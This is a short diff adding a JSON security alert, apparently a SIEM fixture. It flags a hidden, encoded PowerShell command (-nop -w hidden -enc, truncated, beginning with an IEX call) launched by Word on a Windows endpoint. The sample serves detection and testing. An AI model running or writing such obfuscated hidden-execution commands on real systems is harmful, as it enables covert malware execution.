@@ -1,0 +1,13 @@
+{
+  "rule": { "id": "550001", "description": "Suspicious PowerShell Download" },
+  "agent": { "id": "win-001", "name": "WIN10-SECOPS" },
+  "data": {
+    "process": "powershell.exe",
+    "args": "powershell -nop -w hidden -enc SQBFAFgAIA...",
+    "parent": "winword.exe"
+  },
+  "srcip": "203.0.113.25",
+  "timestamp": "2025-10-14T19:21:02Z",
+  "labels": ["endpoint", "windows", "execution"]
+}
+
